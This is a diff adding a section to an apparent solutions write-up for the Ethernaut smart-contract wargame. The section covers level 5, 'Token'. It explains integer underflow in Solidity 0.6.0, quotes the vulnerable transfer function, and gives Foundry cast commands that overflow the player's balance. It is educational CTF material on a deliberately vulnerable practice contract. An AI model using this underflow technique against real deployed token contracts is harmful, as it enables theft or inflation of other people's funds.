@@ -172,3 +172,36 @@ forge create TelephoneHack --constructor-args $TARGET_CONTRACT --private-key $PR
 cast send $ATTACKER_CONTRACT "attack(address)" $YOUR_WALLET_ADDRESS \
   --private-key $PRIVATE_KEY --rpc-url $RPC_URL
 ```
+
+# 5: Token
+**Link:** [Token Challenge](https://ethernaut.openzeppelin.com/level/5)  
+**Bug:** Integer underflow vulnerability  
+**Objective:** Increase your token balance beyond initial allocation  
+**Description:** The contract uses outdated Solidity version (0.6.0) without overflow protection.  
+**Vulnerability Analysis:**  
+- How Integer Limits Work ?
+  - Ethereum uses **unsigned integers (uint256)** with range:  
+    `0` to `2²⁵⁶ - 1`
+  - When arithmetic exceeds these limits, it **wraps around**:
+      - **Overflow:** `MAX + 1 → 0`
+      - **Underflow:** `0 - 1 → MAX` or `X - (X+1)` = `X - X - 1 = -1 -> MAX` assume here X is your current balance. So if you try to transfer at least 1 more than your current salary you will end with having `2²⁵⁶ - 1` as your balance.
+        **Vulnerability Analysis:** 
+
+```solidity
+function transfer(address _to, uint _value) public returns (bool) {
+  require(balances[msg.sender] - _value >= 0);  // Vulnerable check
+  balances[msg.sender] -= _value;              // Potential underflow
+  balances[_to] += _value;
+  return true;
+}
+```
+**Steps to Attack:**
+- Find a victim address (can be any non-zero address)
+- Transfer more tokens than you have (causing underflow)
+- Your balance wraps around to maximum uint256 value
+
+**Using foundry:**
+```shell
+$ cast call $CONTRACT_ADDRESS  "balanceOf(address)" $YOUR_ADDRESS  --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL // to check your current balance
+$ cast send $CONTRACT_ADDRESS  "transfer(address, uint256)" $ANY_ADDRESS  21 --private-key $SEPOLIA_PRIVATE_KEY --rpc-url $SEPOLIA_RPC_URL
+```
